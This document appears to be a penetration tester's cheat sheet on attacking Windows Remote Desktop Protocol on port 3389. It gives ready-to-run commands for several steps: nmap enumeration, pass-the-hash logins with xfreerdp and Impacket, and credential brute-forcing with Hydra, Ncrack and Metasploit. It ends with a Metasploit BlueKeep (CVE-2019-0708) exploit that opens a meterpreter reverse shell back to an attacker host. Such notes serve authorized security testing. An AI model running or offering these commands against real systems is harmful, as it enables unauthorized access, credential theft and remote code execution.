**Remote Desktop Protocol (RDP)** is a proprietary protocol developed by Microsoft that allows users to remotely access Windows machines. Running on **TCP/UDP port 3389**, RDP is a common target for **credential brute-forcing, lateral movement, and remote code execution**.

## Common Attack Vectors

- **Brute-Force Attacks** – Weak or default credentials allow unauthorized access.
- **Exploiting Weak Security Configurations** – Misconfigured RDP settings may allow unauthenticated access.
- **Pass-the-Hash & Pass-the-Ticket Attacks** – Using stolen credentials to authenticate remotely.
- **RDP Tunneling & Port Forwarding** – Evading network restrictions using **SOCKS proxies**.
- **Exploiting RDP Vulnerabilities** – Attacks such as **BlueKeep (CVE-2019-0708)** for **remote code execution**.

## Enumeration
### Check for Open RDP Ports
```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 <target-ip>
```

Confirm RDP is open using xfreerdp:
```bash
xfreerdp3 /u:"user" /p:"pass" /v:192.168.162.145 /clipboard +drive:smbfolder,/home/taylor/Desktop/kali/Cracks /dynamic-resolution
```

xfreerdp with NTLM hash:
```bash
xfreerdp3 /u:"user" /pth:<NTLM-hash> /v:192.168.162.145 /clipboard +drive:smbfolder,/home/taylor/Desktop/kali/Cracks /dynamic-resolution
```

or using Impacket:
```bash
impacket-smbexec <domain>/<user>@<target-ip> -hashes :<NTLM-hash>
```

## Authentication Attacks
### Brute-Force Credentials
Hydra:
```bash
hydra -L users.txt -P passwords.txt rdp://<target-ip>
```

Ncrack:
```bash
ncrack -p 3389 -U users.txt -P passwords.txt <target-ip>
```

MSF:
```bash
msfconsole
use auxiliary/scanner/rdp/rdp_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## Exploiting BlueKeep (CVE-2019-0708)
**BlueKeep** allows **unauthenticated remote code execution** on vulnerable RDP servers.

Check for vulnerability:
```bash
nmap -p 3389 --script rdp-vuln-ms12-020 <target-ip>
```

Exploit via MSF:
```bash
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <target-ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit
```
